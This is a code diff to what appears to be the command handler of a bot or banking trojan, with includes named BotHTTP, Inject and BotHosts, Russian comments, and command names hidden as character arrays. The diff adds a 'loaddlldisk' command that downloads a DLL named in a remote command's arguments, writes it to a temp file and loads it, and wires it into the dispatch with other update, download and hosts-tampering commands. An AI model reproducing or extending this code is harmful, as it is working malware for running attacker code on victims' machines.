@@ -13,6 +13,7 @@
 #include "BotHTTP.h"
 #include "Inject.h"
 #include "BotHosts.h"
+#include "Plugins.h"
 
 
 /* TODO :
@@ -28,7 +29,7 @@
 //---------------------------------------------------------------------------
 // Система вывода отладочной информации
 
-//#include "BotDebug.h"
+#include "BotDebug.h"
 
 namespace TASKDBGTEMPLATES
 {
@@ -692,7 +693,7 @@ bool ExecuteUpdate(PTaskManager, PCHAR Command, PCHAR Args)
 
 bool ExecuteLoadDLL(PTaskManager, PCHAR Command, PCHAR Args)
 {
-	// Команда на загрузку ьиьлиотеки
+	// Команда на загрузку библиотеки
 	WCHAR *FileName = GetTempName();
 
 	if (FileName == NULL)
@@ -706,6 +707,27 @@ bool ExecuteLoadDLL(PTaskManager, PCHAR Command, PCHAR Args)
 	return Result;
 }
 
+bool ExecuteLoadDLLDisk(PTaskManager, PCHAR Command, PCHAR Args)
+{
+	DWORD size = 0;
+	BYTE* data = Plugin::Download( Args, NULL, &size, false );
+	bool res = false;
+	if( data )
+	{
+		char fileName[MAX_PATH];
+		File::GetTempName( fileName, 0 );
+		if( File::WriteBufferA( fileName, data, size ) == size )
+		{
+			HMODULE dll = (HMODULE)pLoadLibraryA(fileName);
+			if( dll )
+			{
+				res = true;
+			}
+		}
+		MemFree(data);
+	}
+	return res;
+}
 
 bool ExecuteMultiDownload(PTaskManager Manager, PCHAR Command, PCHAR Args)
 {
@@ -783,14 +805,16 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 	const static char CommandLoadDll[]       = {'l','o','a','d','d','l','l',0};
 	const static char CommandAlert[]         = {'a', 'l', 'e', 'r', 't', 0};
 	const static char CommandUpdateHosts[]   = {'u', 'p', 'd', 'a', 't', 'e', 'h', 'o', 's', 't', 's',  0};
+	const static char CommandLoadDLLDisk[]	 = {'l','o','a','d','d','l','l','d','i','s','k', 0};
 
-	int Index = StrIndexOf( Command, false, 6,
+	int Index = StrIndexOf( Command, false, 7,
 							(PCHAR)CommandUpdate,
 							(PCHAR)CommandUpdateConfig,
 							(PCHAR)CommandDownload,
 							(PCHAR)CommandLoadDll,
 							(PCHAR)CommandAlert,
-							(PCHAR)CommandUpdateHosts);
+							(PCHAR)CommandUpdateHosts,
+							(PCHAR)CommandLoadDLLDisk);
 
 
 	switch (Index)
@@ -801,6 +825,7 @@ TCommandMethod GetCommandMethod(PTASKMANAGER Manager, PCHAR  Command)
 		case 3: return ExecuteLoadDLL;
 		case 4: return ExecuteAlert;
 		case 5: return Hosts::ExecuteUpdateHostsCommand;
+		case 6: return ExecuteLoadDLLDisk;
 
     default: ;
 	}
